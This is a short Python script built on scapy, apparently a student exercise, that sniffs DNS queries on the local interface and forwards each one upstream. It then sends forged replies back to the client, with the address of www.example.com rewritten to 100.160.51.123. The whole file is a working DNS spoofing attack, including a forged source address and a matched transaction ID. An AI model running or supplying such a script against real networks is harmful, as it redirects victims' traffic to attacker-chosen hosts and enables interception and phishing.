from scapy.config import conf
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sr1, sniff, send

interface = conf.iface
while True:
    # sniff the DNS request
    p = sniff(count = 1, lfilter = lambda pac: DNS in pac and pac[DNS].qr == 0, iface = interface)
    p = p[0]
    print(f"[*] got a DNS request for {p[DNSQR].qname} from {p[IP].src}")

    #create the right DNS request to the DNS root server the DNS server wanted to send
    s = (IP(dst = p[IP].dst) #we are the source
         /UDP(dport = p[UDP].dport) #copy
         /DNS(qr = 0, rd=p[DNS].rd, qd=p[DNS].qd)) # 0 => question, recursion, same questions

    #send it and wait fo an answer
    dns_answer = sr1(s, timeout=2, verbose=False)

    if dns_answer: #check if we got an answer

        if DNS in dns_answer: #check if the answer id a DNS one
            ans =  dns_answer[DNS].an

        if DNSRR in dns_answer: #check if there is an answer to the qurry
            print(f"[*] got a DNS answer for {dns_answer[DNSRR].rrname} is at {dns_answer[DNSRR].rdata}")

        #change a specific IP domain name
        for answer in ans:
            if answer.type == 1 and b"www.example.com" in answer.rrname:
                answer.rdata = "100.160.51.123"
                # the geometry of haggai should get a grad of 100 (in Hebrew ist 4 words)

        #create the response DNS to the server
        r = (IP(dst = p[IP].src, src = p[IP].dst) / # the source is the root server and the dst is the DNS server
             UDP(sport = p[UDP].dport, dport = p[UDP].sport) / # sport -> like the DNS server asked, dport -> from where he sent
             DNS(qr = 1,  id = p[DNS].id,     ra=dns_answer[DNS].ra,     qd=s[DNS].qd,  an = ans,  ar = dns_answer[DNS].ar, ns = dns_answer[DNS].ns))
            #    answer,  same id as he sent, with or without recursion, the questions, the answers ...
        send(r)

        if DNSRR in dns_answer:
            print(f"[*] sending a DNS answer for {r[DNSRR].rrname} is at {r[DNSRR].rdata}")

